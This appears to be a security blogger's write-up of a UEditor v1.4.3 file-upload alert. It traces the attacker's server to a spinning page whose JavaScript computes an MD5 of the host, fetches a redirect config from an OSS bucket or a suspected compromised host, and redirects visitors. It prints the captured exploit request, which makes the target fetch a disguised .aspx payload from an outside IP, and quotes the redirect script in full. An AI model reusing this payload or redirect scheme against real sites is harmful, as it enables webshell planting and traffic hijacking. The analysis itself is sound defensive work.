ailx10说：这篇是我2024年4月写的。又一次 UEditor 上传告警，这回我没有重复前面的复现，而是追了来源页面。页面一直转圈，往 JS 里看，才发现它根据主域名算 MD5，再拼配置地址，失败还会切备用入口，最后跳去返回的域名。最初只是想知道那个图片地址从哪儿来，结果走到了另一套跳转逻辑里。这篇把这个岔路也记了下来：分析告警未必每次都沿着漏洞本身往下，有时候顺手追一个看着普通的网页，会看到后面怎样安排流量的另一面。

---

UEditor告警来源站转圈页面分析，JS以主域名MD5构建配置URL、失败切备用并跳转到返回域名。

## 结论与待核验条件

哈希为路由标识非访问授权；疑似傀儡机未证实，fetch未检查HTTP状态、仅catch时fallback。

## 历史实验记录

上周又又又发现一起文件上传攻击，是UEditor v1.4.3文件上传漏洞利用，威胁载荷如下：

```
POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1



source[]=http://27.124.3.83/gsl.gif?.aspx
```

漏洞复现暂且不表：ailx10：又抓到一个图片马（UEditor）

今天有趣的是黑客的服务器

访问一直就是转圈圈

查看网站源代码，发现了另一个有趣的疑似傀儡机：`housailei.bjxiuxian.com` ，猴赛雷 \- 北京休闲

> 猴赛雷，网络用语中指表示很厉害的意思。2016年春晚，吉祥物“康康”形象公布后，因其脸颊部分有两个球状的凸起，被网友谐音称作“猴腮雷”

这个站点是无法直接访问的

![](/notes-assets/169e3618c5c8d6483010.webp)

从上面的源码得知，猴赛雷网址中必须要输入正确的md5值，才能访问，JS代码的主要目的是从两个URL中获取配置信息，如果一个URL请求失败，它会尝试另一个URL，而构建这个URL的关键是要主域名的md5作为配置文件

```
<script>

	function fetchConfig(urls, index = 0) {

		if (index >= urls.length) {

			return;

		}

		const url = urls[index];

		fetch(url, {

			method: 'GET'

		}).then(response = >response.text()).then(text = >{

			if (text) {

				const finalUrl = text.startsWith('http') ? text: "http://" + text + "";

				window.location.href = finalUrl + location.pathname;

			}

		}).

		catch(error = >{

			console.log(error);

			fetchConfig(urls, index + 1); // 尝试下一个URL

		});

	}



	const md5Value = md5(location.host.replace('www.', '')).toString();

	const urls = ["http://redirect-302.oss-cn-shanghai.aliyuncs.com/config/" + md5Value + ".txt", 

                      "http://housailei.bjxiuxian.com/config/" + md5Value + ".txt"];

	fetchConfig(urls);

</script>

```

这里的MD5更像路由标识，不是访问授权。页面行为能解释一段跳转链，不能独自确认主机身份；分析到哪儿，结论就写到哪儿。
